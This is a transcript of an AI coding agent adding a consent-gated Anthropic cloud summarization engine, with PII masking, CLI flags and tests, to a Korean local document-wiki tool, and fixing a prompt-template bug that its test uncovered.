● Update(corpbrain\core\llm\summarize.py)
  ⎿  Added 17 lines
      104      return validate_summary_fields(parsed)
      105  
      106  
      107 +class OllamaSummarizer:                                       
      108 +    """로컬 요약 백엔드 — `llm.base.Summarizer` 프로토콜 구현 
          +(v0.5 스펙 §4.3)."""                                          
      109 +                                                              
      110 +    engine = ENGINE_LOCAL                                     
      111 +                                                              
      112 +    def __init__(                                             
      113 +        self, model: str, ollama_url: str, *, timeout: float =
          + DEFAULT_TIMEOUT                                              
      114 +    ) -> None:                                                
      115 +        self.model = model                                    
      116 +        self._ollama_url = ollama_url                         
      117 +        self._timeout = timeout                               
      118 +                                                              
      119 +    def summarize(self, text: str) -> SummaryResult:          
      120 +        """문서 텍스트를 로컬 Ollama로 요약한다 (외부 전송 없 
          +음 — PII 마스킹 대상 아님)."""                                
      121 +        return summarize(text, self.model, self._ollama_url, t
          +imeout=self._timeout)                                         
      122 +                                                              
      123 +                                                              
      124  def _response_text(envelope: Any) -> str:
      125      """Ollama `/api/generate` 응답 봉투에서 모델이 생성한 본문
            문자열을 꺼낸다."""
      126      if not isinstance(envelope, dict):

● Update(corpbrain\core\llm\summarize.py)
  ⎿  Added 1 line, removed 1 line
      16  from urllib.parse import urljoin  # 순수 문자열 유틸 — 네트워크
           호출 없음
      17  
      18  from corpbrain.core import gateway
      19 -from corpbrain.core.config import DEFAULT_MODEL, DEFAULT_OLLAMA
         -_URL                                                           
      19 +from corpbrain.core.config import DEFAULT_MODEL, DEFAULT_OLLAMA
         +_URL, ENGINE_LOCAL                                             
      20  from corpbrain.core.llm.base import LLMParseError, validate_sum
          mary_fields
      21  from corpbrain.core.models import SummaryResult
      22  

● Now the pipeline — preflight, engine dispatch, and cloud failure mapping.

● Update(corpbrain\core\pipeline.py)
  ⎿  Added 12 lines, removed 2 lines
      32      RunStarted,
      33      Stage,
      34  )
      35 -from corpbrain.core.config import ScanConfig                   
      35 +from corpbrain.core.config import ENGINE_CLOUD, ScanConfig     
      36 +from corpbrain.core.consent import is_cloud_consent_granted    
      37  from corpbrain.core.embedding_text import parse_wiki_markdown, 
          summary_embedding_text
      38  from corpbrain.core.errors import (
      39      GpuGateError,
     ...
      41      TokenBudgetExceededError,
      42  )
      43  from corpbrain.core.extract import prepare_summary_input
      44 +from corpbrain.core.llm.anthropic_client import (              
      45 +    AnthropicSummarizer,                                       
      46 +    CloudApiError,                                             
      47 +    CloudRateLimitedError,                                     
      48 +    preflight,                                                 
      49 +    resolve_api_key,                                           
      50 +)                                                              
      51 +from corpbrain.core.llm.base import LLMParseError, Summarizer  
      52  from corpbrain.core.llm.embed import EmbeddingError, embed
      53  from corpbrain.core.llm.ollama_client import (
      54      ModelNotAvailableError,
      55      list_models,
      56      model_present,
      57  )
      49 -from corpbrain.core.llm.summarize import LLMParseError, summari
         -ze                                                             
      58 +from corpbrain.core.llm.summarize import OllamaSummarizer      
      59  from corpbrain.core.models import (
      60      EmbeddingFailure,
      61      GeneratedWiki,
      62 +    PiiMasking,                                                
      63      ScanPlan,
      64      ScanResult,
      65      SkippedFile,

● Update(corpbrain\core\pipeline.py)
  ⎿  Added 15 lines, removed 1 line
      134      # 확정하고, 첫 위반에서 즉시 예외로 종료한다. ①~④는 --forc
           e-gates로 우회 불가.
      135      # 모델 목록은 한 번만 조회해 두 모델(요약·임베딩)을 함께 
           확인한다(왕복 절반으로 줄임).
      136      root = validated_root(config.folder)
      137 +    cloud = config.engine == ENGINE_CLOUD                     
      138 +                                                              
      139 +    # 클라우드 선행 조건(동의 → API 키 → 인증 프리플라이트)을 
          +네트워크보다 먼저 확정한다                                    
      140 +    # (v0.5 §4.3 · §3 항목2·4). 동의 확인은 로컬 파일 읽기라  
          +가장 값싸므로 맨 앞에 둔다.                                   
      141 +    api_key: str | None = None                                
      142 +    if cloud:                                                 
      143 +        _require_cloud_consent()                              
      144 +        api_key = resolve_api_key()                           
      145 +                                                              
      146 +    # 임베딩은 엔진과 무관하게 항상 로컬이므로(v0.5 §2 비목표)
          + Ollama 데몬과 임베딩 모델은                                  
      147 +    # 두 엔진 모두에서 확인한다. 요약 모델은 로컬 엔진일 때만 
          +의미가 있다.                                                  
      148      available_models = list_models(config.ollama_url)
      138 -    if not model_present(available_models, config.model):     
      149 +    if not cloud and not model_present(available_models, confi
          +g.model):                                                     
      150          raise ModelNotAvailableError(
      151              f"대상 모델을 찾지 못했습니다: {config.model} — "
      152              f"먼저 `ollama pull {config.model}` 를 실행하세요.
           "
     ...
      157              f"먼저 `ollama pull {config.embed_model}` 를 실행
           하세요."
      158          )
      159  
      160 +    if api_key is not None:                                   
      161 +        preflight(api_key)                                    
      162 +                                                              
      163      # 게이트 판정은 상한(`--max`) 절단 이전의 발견 집합으로 계
           산한다(플랜은 순수·로컬).
      164      # 어댑터가 배너용으로 이미 계산한 plan을 넘기면 재사용해 
           하드웨어 감지·stat 패스를 아끼는다.
      165      if findings is None:

● Update(corpbrain\core\pipeline.py)
  ⎿  Added 4 lines, removed 2 lines
      178          discovered_count=findings.discovered_count,
      179      )
      180  
      181 +    summarizer = _build_summarizer(config, api_key)           
      182 +                                                              
      183      total = len(findings.targets)
      182 -    _emit(on_event, RunStarted(at=time.monotonic(), model=conf
          -ig.model, total=total))                                       
      184 +    _emit(on_event, RunStarted(at=time.monotonic(), model=summ
          +arizer.model, total=total))                                   
      185  
      186      if findings.limit_exceeded:
      187          _emit(on_event, RunFinished(at=time.monotonic()))
     ...
      195              _process_one(
      196                  source_path, root, config, result,
      197                  on_event=on_event, index=index, total=total, r
           un_state=run_state,
      196 -                store=store, existing_ids=existing_ids,       
      198 +                store=store, existing_ids=existing_ids, summar
          +izer=summarizer,                                              
      199              )
      200              out_path = output_path_for(source_path, root, conf
           ig.out_dir)
      201              if out_path.exists():

● Update(corpbrain\core\pipeline.py)
  ⎿  Added 23 lines, removed 1 line
      218      return result
      219  
      220  
      221 +def _require_cloud_consent() -> None:                         
      222 +    """클라우드 엔진 사용 동의를 확인한다 — 없으면 선행 조건  
          +실패 (v0.5 §3 항목2)."""                                      
      223 +    if is_cloud_consent_granted():                            
      224 +        return                                                
      225 +    raise PreconditionError(                                  
      226 +        "cloud 엔진 사용 동의가 필요합니다 — 문서 내용이 외부(
          +Anthropic)로 전송됩니다. "                                    
      227 +        "먼저 `corpbrain consent cloud --grant` 를 실행하세요.
          +"                                                             
      228 +    )                                                         
      229 +                                                              
      230 +                                                              
      231 +def _build_summarizer(config: ScanConfig, api_key: str | None)
          + -> Summarizer:                                               
      232 +    """`config.engine`으로 요약 백엔드를 고른다 — 파이프라인은
          + 이후 백엔드를 알지 못한다."""                                
      233 +    if config.engine == ENGINE_CLOUD:                         
      234 +        assert api_key is not None  # noqa: S101 - 프리플라이 
          +트에서 이미 확정된 불변식                                     
      235 +        return AnthropicSummarizer(config.cloud_model, api_key
          +)                                                             
      236 +    return OllamaSummarizer(config.model, config.ollama_url)  
      237 +                                                              
      238 +                                                              
      239  def _enforce_gates(config: ScanConfig, plan: ScanPlan) -> None
           :
      240      """차단 게이트(GPU·토큰)를 강제한다 — 첫 위반에서 예외로 
           종료 (v0.3 스펙 §4.2).
      241  
      242      `--force-gates`면 두 차단 게이트를 모두 무시한다(단 `file_
           too_large` 스킵은 별개다).
      243      개별 파일 크기 게이트는 여기서 다루지 않고 파일 처리 단계
           에서 스킵으로 처리한다.
      244 +                                                              
      245 +    v0.5: `engine="cloud"`면 GPU 게이트를 건너뛴다 — 클라우드 
          +요약은 로컬 GPU를 전혀 쓰지                                   
      246 +    않으므로 GPU 미탐지가 차단 사유가 될 수 없다 (§4.7). 토큰 
          +게이트는 비용 보호 목적이라                                   
      247 +    엔진과 무관하게 그대로 적용한다.                          
      248      """
      249      gate = plan.gate
      250      if config.force_gates or gate is None:
      251          return
      230 -    if not gate.gpu_ok:                                       
      252 +    if config.engine != ENGINE_CLOUD and not gate.gpu_ok:     
      253          raise GpuGateError(
      254              "GPU를 감지하지 못했습니다 — CPU로 강행하려면 --fo
           rce-gates 를 쓰세요 "
      255              f"(감지: {plan.hardware.label})."

● Now _process_one — engine-aware summarize, cloud failure mapping, PII
  tracking.

● Update(corpbrain\core\pipeline.py)
  ⎿  Added 1 line
      309      run_state: _RunState,
      310      store: VectorStore,
      311      existing_ids: frozenset[str],
      312 +    summarizer: Summarizer,                                   
      313  ) -> None:
      314      """파일 1개를 처리한다 — 어떤 실패도 이 함수 밖으로 새어 
           나가지 않는다."""
      315      out_path = output_path_for(source_path, root, config.out_d
           ir)

● Update(corpbrain\core\pipeline.py)
  ⎿  Added 1 line, removed 1 line
      331                                      detail=detail))
      332          return
      333  
      334 -    if not should_regenerate(source_path, out_path, config.for
          -ce):                                                          
      334 +    if not should_regenerate(source_path, out_path, config.for
          +ce, engine=summarizer.engine):                                
      335          result.skipped.append(SkippedFile(path=source_path, re
           ason=SkipReason.UP_TO_DATE))
      336          # 위키는 스킵돼도, 인덱스에 이 문서 벡터가 아직 없으면
            기존 위키에서 백필한다
      337          # (v0.4 스펙 §3 항목3 정정 — 재생성 여부가 아니라 인덱
           스 존재 여부가 기준).

● Update(corpbrain\core\pipeline.py)
  ⎿  Added 10 lines, removed 7 lines
      356      _emit(on_event, FileStage(at=time.monotonic(), index=index
           , total=total,
      357                                path=path_str, stage=Stage.SUMMA
           RIZE))
      358      if not run_state.model_loaded:
      359 -        _emit(on_event, ModelLoading(at=time.monotonic(), mode
          -l=config.model))                                              
      359 +        _emit(on_event, ModelLoading(at=time.monotonic(), mode
          +l=summarizer.model))                                          
      360      started = time.monotonic()
      361      try:
      362 -        summary = summarize(prepared.text, config.model, confi
          -g.ollama_url)                                                 
      363 -    except LLMParseError as exc:                              
      362 +        summary = summarizer.summarize(prepared.text)         
      363 +    except (LLMParseError, CloudRateLimitedError, CloudApiErro
          +r) as exc:                                                    
      364          run_state.model_loaded = True
      365 +        reason = _summary_failure_reason(exc)                 
      366          result.skipped.append(
      366 -            SkippedFile(path=source_path, reason=SkipReason.SU
          -MMARY_FAILED, detail=str(exc))                                
      367 +            SkippedFile(path=source_path, reason=reason, detai
          +l=str(exc))                                                   
      368          )
      369          _emit(on_event, FileSkipped(at=time.monotonic(), index
           =index, total=total,
      369 -                                    path=path_str, reason=Skip
          -Reason.SUMMARY_FAILED.value,                                  
      370 +                                    path=path_str, reason=reas
          +on.value,                                                     
      371                                      detail=str(exc)))
      372          return
      373      latency = time.monotonic() - started
      374      if not run_state.model_loaded:
      375          run_state.model_loaded = True
      375 -        _emit(on_event, ModelReady(at=time.monotonic(), model=
          -config.model, latency=latency))                               
      376 +        _emit(on_event, ModelReady(at=time.monotonic(), model=
          +summarizer.model, latency=latency))                           
      377 +    _record_masking(source_path, summarizer, result)          
      378  
      379      _emit(on_event, FileStage(at=time.monotonic(), index=index
           , total=total,
      380                                path=path_str, stage=Stage.RENDE
           R))
      381      markdown = render_markdown(
      382          summary,
      383          source_path=path_str,
      382 -        model=config.model,                                   
      384 +        model=summarizer.model,                               
      385          source_bytes=size_bytes,
      386          generated_at=datetime.now().astimezone().isoformat(),
      387 +        engine=summarizer.engine,                             
      388      )
      389  
      390      _emit(on_event, FileStage(at=time.monotonic(), index=index
           , total=total,

● Update(corpbrain\core\pipeline.py)
  ⎿  Added 26 lines
      412                                    path=path_str, output_path=s
           tr(out_path), latency=latency))
      413  
      414  
      415 +def _summary_failure_reason(exc: Exception) -> SkipReason:    
      416 +    """요약 실패를 스킵 사유로 매핑한다 — 429만 별도, 나머지  
          +클라우드 실패는 한 사유 (v0.5 §3 항목8)."""                   
      417 +    if isinstance(exc, CloudRateLimitedError):                
      418 +        return SkipReason.CLOUD_RATE_LIMITED                  
      419 +    if isinstance(exc, CloudApiError):                        
      420 +        return SkipReason.CLOUD_API_ERROR                     
      421 +    return SkipReason.SUMMARY_FAILED                          
      422 +                                                              
      423 +                                                              
      424 +def _record_masking(source_path: Path, summarizer: Summarizer,
          + result: ScanResult) -> None:                                 
      425 +    """직전 요약에서 마스킹된 PII 건수를 결과에 남긴다 (v0.5 §
          +4.5).                                                         
      426 +                                                              
      427 +    로컬 백엔드는 마스킹을 하지 않으므로(외부로 나가지 않는다)
          + 남길 것이 없다.                                              
      428 +    """                                                       
      429 +    masked = getattr(summarizer, "last_mask", None)           
      430 +    if masked is None or not masked.counts:                   
      431 +        return                                                
      432 +    result.pii_maskings.append(                               
      433 +        PiiMasking(                                           
      434 +            path=source_path,                                 
      435 +            total=masked.total,                               
      436 +            counts={pii_type.value: count for pii_type, count 
          +in masked.counts.items()},                                    
      437 +        )                                                     
      438 +    )                                                         
      439 +                                                              
      440 +                                                              
      441  def _backfill_embedding(
      442      source_path: Path,
      443      out_path: Path,

  Ran 1 shell command (ctrl+o to expand)

● Update(corpbrain\core\pipeline.py)
  ⎿  Added 3 lines, removed 2 lines
      231  def _build_summarizer(config: ScanConfig, api_key: str | None)
            -> Summarizer:
      232      """`config.engine`으로 요약 백엔드를 고른다 — 파이프라인은
            이후 백엔드를 알지 못한다."""
      233      if config.engine == ENGINE_CLOUD:
      234 -        assert api_key is not None  # noqa: S101 - 프리플라이 
          -트에서 이미 확정된 불변식                                     
      235 -        return AnthropicSummarizer(config.cloud_model, api_key
          -)                                                             
      234 +        # 프리플라이트에서 이미 확정돼 있지만, 코어 API를 직접
          + 호출하는 경로(어댑터 없이                                    
      235 +        # run_scan을 부르는 UI 등)를 위해 여기서도 방어적으로 
          +해소한다.                                                     
      236 +        return AnthropicSummarizer(config.cloud_model, api_key
          + or resolve_api_key())                                        
      237      return OllamaSummarizer(config.model, config.ollama_url)
      238  
      239  

● Now the CLI — --engine, --cloud-model, and the consent subcommand.

● Update(corpbrain\cli.py)
  ⎿  Added 42 lines
      190              f"scan은 항상 인덱싱까지 수행하며 이 모델이 없으면
            exit 1로 종료한다."
      191          ),
      192      )
      193 +    scan.add_argument(                                        
      194 +        "--engine",                                           
      195 +        dest="engine",                                        
      196 +        choices=core.ENGINES,                                 
      197 +        default=core.ENGINE_LOCAL,                            
      198 +        help=(                                                
      199 +            f"요약 엔진 (기본 {core.ENGINE_LOCAL}). "         
      200 +            f"{core.ENGINE_CLOUD}는 `corpbrain consent cloud -
          +-grant` 동의와 "                                              
      201 +            f"{API_KEY_ENV_VAR} 환경변수가 모두 있어야 한다.  
          +임베딩은 언제나 로컬이다."                                    
      202 +        ),                                                    
      203 +    )                                                         
      204 +    scan.add_argument(                                        
      205 +        "--cloud-model",                                      
      206 +        dest="cloud_model",                                   
      207 +        default=core.DEFAULT_CLOUD_MODEL,                     
      208 +        metavar="NAME",                                       
      209 +        help=(                                                
      210 +            f"--engine {core.ENGINE_CLOUD}일 때 쓸 Anthropic  
          +모델 "                                                        
      211 +            f"(기본 {core.DEFAULT_CLOUD_MODEL})."             
      212 +        ),                                                    
      213 +    )                                                         
      214  
      215 +    consent = subparsers.add_parser(                          
      216 +        "consent",                                            
      217 +        help="클라우드 엔진 사용 동의를 기록·철회한다 (로컬 설
          +정 파일에 저장).",                                            
      218 +    )                                                         
      219 +    consent.add_argument(                                     
      220 +        "provider",                                           
      221 +        choices=["cloud"],                                    
      222 +        help="동의 대상. 현재는 cloud(Anthropic API)뿐이다.", 
      223 +    )                                                         
      224 +    consent_action = consent.add_mutually_exclusive_group(requ
          +ired=True)                                                    
      225 +    consent_action.add_argument(                              
      226 +        "--grant",                                            
      227 +        action="store_true",                                  
      228 +        help="클라우드 엔진 사용에 동의하고 그 사실을 로컬 설 
          +정 파일에 기록한다.",                                         
      229 +    )                                                         
      230 +    consent_action.add_argument(                              
      231 +        "--revoke",                                           
      232 +        action="store_true",                                  
      233 +        help="기록된 동의를 철회한다. 이후 --engine cloud 는  
          +다시 차단된다.",                                              
      234 +    )                                                         
      235 +                                                              
      236      search = subparsers.add_parser(
      237          "search",
      238          help="이미 생성된 위키 인덱스에서 자연어 쿼리와 유사한
            문서를 찾는다.",

● Update(corpbrain\cli.py)
  ⎿  Added 2 lines
      354          max_file_size=args.max_file_size_mb * BYTES_PER_MB,
      355          max_total_tokens=args.max_total_tokens,
      356          force_gates=args.force_gates,
      357 +        engine=args.engine,                                   
      358 +        cloud_model=args.cloud_model,                         
      359      )
      360  
      361  

● Update(corpbrain\cli.py)  ⎿  Added 23 lines
      386          return _run_doctor(args)
      387      if args.command == "search":
      388          return _run_search(args)
      389 +    if args.command == "consent":                             
      390 +        return _run_consent(args)                             
      391      return _run_scan(args)
      392  
      393  
      394 +def _run_consent(args: argparse.Namespace) -> int:            
      395 +    """`consent cloud --grant|--revoke` — 클라우드 사용 동의를
          + 기록·철회한다 (v0.5 §4.1).                                   
      396 +                                                              
      397 +    동의는 로컬 설정 파일에만 남고 API 키는 저장하지 않는다.  
          +쓰기 실패는 코어가                                            
      398 +    `PreconditionError` 하위로 올리므로 기존 exit 1 매핑을 그 
          +대로 쓴다.                                                    
      399 +    """                                                       
      400 +    try:                                                      
      401 +        if args.grant:                                        
      402 +            core.grant_cloud_consent()                        
      403 +            print(f"cloud 엔진(Anthropic API) 사용에 동의했습 
          +니다 — {core.consent_path()}")                                
      404 +            print("- 문서 내용이 외부(Anthropic)로 전송됩니다 
          +(PII 7종은 자동 마스킹).")                                    
      405 +            print(f"- API 키는 {API_KEY_ENV_VAR} 환경변수로 지
          +정하세요 (파일에 저장되지 않습니다).")                        
      406 +        else:                                                 
      407 +            core.revoke_cloud_consent()                       
      408 +            print(f"cloud 엔진 사용 동의를 철회했습니다 — {cor
          +e.consent_path()}")                                           
      409 +    except PreconditionError as exc:                          
      410 +        _log(f"선행 조건 실패: {exc}")                        
      411 +        return EXIT_PRECONDITION_FAILED                       
      412 +    return EXIT_OK                                            
      413 +                                                              
      414 +                                                              
      415  def _force_utf8_output() -> None:
      416      """stdout/stderr를 UTF-8로 맞춘다 (스펙 §4.3 출력 언어 한
           국어).
      417  

  Read 1 file (ctrl+o to expand)

● Update(corpbrain\core\__init__.py)
  ⎿  Added 12 lines
      23  from __future__ import annotations
      24  
      25  from corpbrain.core.config import (
      26 +    DEFAULT_CLOUD_MODEL,                                       
      27      DEFAULT_EMBED_MODEL,
      28      DEFAULT_MAX_CHARS,
      29      DEFAULT_MAX_FILE_SIZE,
     ...
      32      DEFAULT_MODEL,
      33      DEFAULT_OLLAMA_URL,
      34      DEFAULT_OUT_DIR,
      35 +    ENGINE_CLOUD,                                              
      36 +    ENGINE_LOCAL,                                              
      37 +    ENGINES,                                                   
      38      MAX_PATH_LENGTH,
      39      SUPPORTED_EXTENSIONS,
      40      ScanConfig,
      41  )
      42 +from corpbrain.core.consent import (                           
      43 +    default_config_path as consent_path,                       
      44 +)                                                              
      45 +from corpbrain.core.consent import (                           
      46 +    grant_cloud_consent,                                       
      47 +    is_cloud_consent_granted,                                  
      48 +    revoke_cloud_consent,                                      
      49 +)                                                              
      50  from corpbrain.core.environment import DoctorReport, diagnose
      51  from corpbrain.core.errors import (
      52      CorpBrainError,

● Update(corpbrain\core\__init__.py)
  ⎿  Added 1 line
      59      GateVerdict,
      60      GeneratedWiki,
      61      HardwareInfo,
      62 +    PiiMasking,                                                
      63      PlanEntry,
      64      ScanPlan,
      65      ScanResult,

● Update(corpbrain\core\__init__.py)
  ⎿  Added 9 lines
      74  from corpbrain.core.vectorstore import index_path_for
      75  
      76  __all__ = [
      77 +    "DEFAULT_CLOUD_MODEL",                                     
      78      "DEFAULT_EMBED_MODEL",
      79      "DEFAULT_MAX_CHARS",
      80      "DEFAULT_MAX_FILES",
     ...
      83      "DEFAULT_MODEL",
      84      "DEFAULT_OLLAMA_URL",
      85      "DEFAULT_OUT_DIR",
      86 +    "ENGINES",                                                 
      87 +    "ENGINE_CLOUD",                                            
      88 +    "ENGINE_LOCAL",                                            
      89      "MAX_PATH_LENGTH",
      90      "SUPPORTED_EXTENSIONS",
      91      "CorpBrainError",
     ...
       96      "GpuGateError",
       97      "HardwareInfo",
       98      "IndexNotFoundError",
       99 +    "PiiMasking",                                             
      100      "PlanEntry",
      101      "PreconditionError",
      102      "ScanConfig",
     ...
      107      "SkippedFile",
      108      "SummaryResult",
      109      "TokenBudgetExceededError",
      110 +    "consent_path",                                           
      111      "diagnose",
      112 +    "grant_cloud_consent",                                    
      113      "index_path_for",
      114 +    "is_cloud_consent_granted",                               
      115      "plan_scan",
      116 +    "revoke_cloud_consent",                                   
      117      "run_scan",
      118      "search_index",
      119  ]

● Update(corpbrain\cli.py)
  ⎿  Added 1 line
      25      render_status_line,
      26  )
      27  from corpbrain.core.errors import PreconditionError, TokenBudge
          tExceededError
      28 +from corpbrain.core.llm.anthropic_client import API_KEY_ENV_VAR
      29  from corpbrain.core.report import (
      30      build_detail_lines,
      31      build_doctor_lines,

  Ran 1 shell command (ctrl+o to expand)

● CLI 표면 동작 확인. 이제 doctor 확장과 리포트를 마무리한다.

  Read 1 file (ctrl+o to expand)

● Update(corpbrain\core\environment.py)
  ⎿  Added 14 lines, removed 1 line
      54      #: 현재 게이트 임계값 (정보 표시).
      55      max_file_size: int
      56      max_total_tokens: int
      57 +    #: 클라우드 엔진 사용 동의가 기록돼 있는가 (v0.5 §3 항목10)
         +. 경고성 정보다.                                               
      58 +    cloud_consent: bool = False                                
      59 +    #: `ANTHROPIC_API_KEY` 환경변수가 설정돼 있는가 (값 자체는 
         +담지 않는다) (v0.5 §3 항목10).                                 
      60 +    cloud_api_key: bool = False                                
      61  
      62      @property
      63 +    def cloud_ready(self) -> bool:                             
      64 +        """`--engine cloud` 를 바로 쓸 수 있는 상태인가 (동의 +
         + API 키).                                                      
      65 +                                                               
      66 +        `ready`(종료 코드 판정)에는 영향을 주지 않는다 — 클라우
         +드는 옵트인이라 준비되지                                       
      67 +        않은 것이 기본 상태이며, 로컬만 쓰는 사용자에게 doctor 
         +가 실패로 보이면 안 된다.                                      
      68 +        """                                                    
      69 +        return self.cloud_consent and self.cloud_api_key       
      70 +                                                               
      71 +    @property                                                  
      72      def ready(self) -> bool:
      73          """필수 조건(설치·구동·대상 모델·임베딩 모델)이 모두 충
          족됐는가.
      74  
      62 -        GPU 없음은 준비 판정과 무관하다.                       
      75 +        GPU 없음과 클라우드 준비 상태는 준비 판정과 무관하다 (v
         +0.5 §3 항목10 — GPU 선례).                                     
      76          """
      77          return (
      78              self.installed

● Update(corpbrain\core\environment.py)
  ⎿  Added 2 lines
      123          hardware=hardware,
      124          max_file_size=max_file_size,
      125          max_total_tokens=max_total_tokens,
      126 +        cloud_consent=is_cloud_consent_granted(),             
      127 +        cloud_api_key=bool(os.environ.get(API_KEY_ENV_VAR, "")
          +.strip()),                                                    
      128      )

● Update(corpbrain\core\environment.py)
  ⎿  Added 3 lines
      10  
      11  from __future__ import annotations
      12  
      13 +import os                                                      
      14  import shutil
      15  from dataclasses import dataclass
      16  
     ...
      21      DEFAULT_MODEL,
      22      DEFAULT_OLLAMA_URL,
      23  )
      24 +from corpbrain.core.consent import is_cloud_consent_granted    
      25  from corpbrain.core.llm import ollama_client
      26 +from corpbrain.core.llm.anthropic_client import API_KEY_ENV_VAR
      27  from corpbrain.core.llm.ollama_client import OllamaNotAvailable
          Error
      28  from corpbrain.core.models import HardwareInfo
      29  from corpbrain.core.plan import detect_hardware

● Now the report lines for doctor and the scan summary (PII counts, cloud skip
  reasons).

  Ran 1 shell command (ctrl+o to expand)

● Update(corpbrain\core\report.py)
  ⎿  Added 2 lines
      235      else:
      236          lines.append(f"  [경고] {report.hardware.label} — scan
           은 GPU 없이 --force-gates 필요")
      237  
      238 +    lines.extend(_cloud_doctor_lines(report))                 
      239 +                                                              
      240      lines.append(
      241          f"  [정보] 게이트 임계: 파일 {report.max_file_size:,} 
           bytes · "
      242          f"총토큰 {report.max_total_tokens:,}"

● Update(corpbrain\core\report.py)
  ⎿  Added 22 lines
      199      return lines
      200  
      201  
      202 +def _cloud_doctor_lines(report: DoctorReport) -> list[str]:   
      203 +    """클라우드 옵트인 상태 줄 — GPU와 같은 경고성 표시다 (v0.
          +5 §4.1·§3 항목10).                                            
      204 +                                                              
      205 +    동의·API 키는 옵트인이라 없는 것이 기본 상태이므로 [실패] 
          +가 아닌 [경고]로 내고,                                        
      206 +    `report.ready`(종료 코드)에는 영향을 주지 않는다.         
      207 +    """                                                       
      208 +    if report.cloud_ready:                                    
      209 +        return ["  [OK] Cloud(Anthropic): 사용 준비됨"]       
      210 +    lines: list[str] = []                                     
      211 +    if report.cloud_consent:                                  
      212 +        lines.append("  [OK] Cloud 동의: 기록됨")             
      213 +    else:                                                     
      214 +        lines.append(                                         
      215 +            "  [경고] Cloud 동의: 없음 — `corpbrain consent cl
          +oud --grant` 로 동의"                                         
      216 +        )                                                     
      217 +    if report.cloud_api_key:                                  
      218 +        lines.append(f"  [OK] {API_KEY_ENV_VAR}: 설정됨")     
      219 +    else:                                                     
      220 +        lines.append(f"  [경고] {API_KEY_ENV_VAR}: 미설정 — 환
          +경변수로 설정 필요")                                          
      221 +    return lines                                              
      222 +                                                              
      223 +                                                              
      224  def build_doctor_lines(report: DoctorReport) -> list[str]:
      225      """`doctor`가 stdout에 낼 한국어 체크리스트 — 실패 항목에 
           해결 명령을 함께 낸다 (v0.4 §4.3).
      226  

  Ran 1 shell command (ctrl+o to expand)

● Update(corpbrain\core\report.py)
  ⎿  Added 19 lines
       78      # 위키는 생성됐지만 인덱싱만 실패한 문서 — 스킵과 구분되는
            별도 집계 (v0.4 §4.3).
       79      if result.embedding_failures:
       80          lines.append(f"인덱싱 실패 {len(result.embedding_failu
           res)}건 (위키는 생성됨)")
       81 +    # 클라우드로 나가기 전 가려진 개인정보 집계 (v0.5 §4.5).  
          +로컬 엔진이면 항상 비어 있다.                                 
       82 +    lines.extend(_pii_summary_lines(result))                  
       83      lines.append(f"출력 경로: {result.out_dir}")
       84      return lines
       85  
       86  
       87 +def _pii_summary_lines(result: ScanResult) -> list[str]:      
       88 +    """마스킹된 PII를 문서 수·총 건수·유형별로 요약한다 (v0.5 
          +§4.5)."""                                                     
       89 +    if not result.pii_maskings:                               
       90 +        return []                                             
       91 +    per_type: dict[str, int] = {}                             
       92 +    for masking in result.pii_maskings:                       
       93 +        for name, count in masking.counts.items():            
       94 +            per_type[name] = per_type.get(name, 0) + count    
       95 +    total = sum(masking.total for masking in result.pii_maskin
          +gs)                                                           
       96 +    breakdown = ", ".join(                                    
       97 +        f"{name} {count}건" for name, count in sorted(per_type
          +.items())                                                     
       98 +    )                                                         
       99 +    return [                                                  
      100 +        f"PII 마스킹 {total}건 (문서 {len(result.pii_maskings)
          +}개) — {breakdown}",                                          
      101 +    ]                                                         
      102 +                                                              
      103 +                                                              
      104  def build_search_lines(results: list[SearchResult]) -> list[st
           r]:
      105      """`search`가 stdout에 낼 결과 줄 — 점수 내림차순 제목·경
           로 (v0.4 스펙 §3 항목6)."""
      106      if not results:

  Ran 1 shell command (ctrl+o to expand)

● Update(corpbrain\core\report.py)
  ⎿  Added 2 lines
      34      SkipReason.SUMMARY_FAILED: "LLM JSON 파싱 실패",
      35      SkipReason.UP_TO_DATE: "최신 상태(재생성 불필요)",
      36      SkipReason.FILE_TOO_LARGE: "파일 크기 초과",
      37 +    SkipReason.CLOUD_RATE_LIMITED: "클라우드 레이트리밋(429)", 
      38 +    SkipReason.CLOUD_API_ERROR: "클라우드 호출 실패",          
      39  }
      40  
      41  

● Update(corpbrain\core\report.py)
  ⎿  Added 1 line
       8  
       9  from typing import TYPE_CHECKING
      10  
      11 +from corpbrain.core.llm.anthropic_client import API_KEY_ENV_VAR
      12  from corpbrain.core.models import (
      13      PlanEntry,
      14      ScanPlan,

  Ran 1 shell command (ctrl+o to expand)

● 통합 배선 완료, 회귀 없음. 커밋하고 v0.5 완료의 정의를 검증하는 테스트를
  작성한다.

  Ran 2 shell commands (ctrl+o to expand)
● 테스트 관례를 파악했다. v0.5 완료의 정의를 검증하는 통합 테스트를 작성한다.

● Write(tests\integration\test_cloud_engine.py)
  ⎿  Wrote 459 lines to tests\integration\test_cloud_engine.py
       1 """클라우드 옵트인 통합 테스트 (v0.5 스펙 §3 완료의 정의 1~6·8~1
         1).
       3 Anthropic·Ollama HTTP는 단일 관문(`gateway.request_json`)을 스텁
         하고, `run_scan`을 코어 API로
       4 직접 호출한다 — 실제 API에는 접속하지 않는다. 동의 설정 파일은 `
       5 사용자 홈을 오염시키지 않는다.
       6 """
       7 
       9 
      10 import json
     … +518 lines (ctrl+o to expand)

  Ran 1 shell command (ctrl+o to expand)

● 테스트 2건 실패 — 실제 마스킹 출력과 프롬프트 내용을 직접 확인해 원인을
  좁힌다.

  Ran 1 shell command (ctrl+o to expand)

● 테스트가 진짜 버그를 잡았다 — PROMPT_TEMPLATE의 {{document}}가 .replace()
  이후에도 이스케이프된 채로 남아 문서 본문이 프롬프트에 전혀 들어가지 않았다.
  (PII 무유출 단언이 공허하게 통과할 뻔했다.)

● Update(corpbrain\core\llm\anthropic_client.py)
  ⎿  Added 3 lines, removed 3 lines
      222      스키마 강제는 `tool_choice`가 담당하므로 "JSON만 출력하라"
            류의 문구가 필요 없다
      223      (v0.5 §4.3). 한국어 출력·5필드 의미·환각 금지 등 provider 
           무관한 제품 규칙은 그대로 둔다.
      224      """
      225 -    return PROMPT_TEMPLATE.format(document=document)          
      225 +    return PROMPT_TEMPLATE.format(tool_name=SUMMARY_TOOL_NAME,
          + document=document)                                           
      226  
      227  
      228  PROMPT_TEMPLATE = """당신은 사내 문서를 정리하는 한국어 지식 
           관리 도우미입니다.
     ...
      236  
      237  문서:
      238  \"\"\"
      239 -{{document}}                                                  
      239 +{document}                                                    
      240  \"\"\"
      241 -""".replace("{tool_name}", SUMMARY_TOOL_NAME)                 
      241 +"""                                                           
      242  
      243  
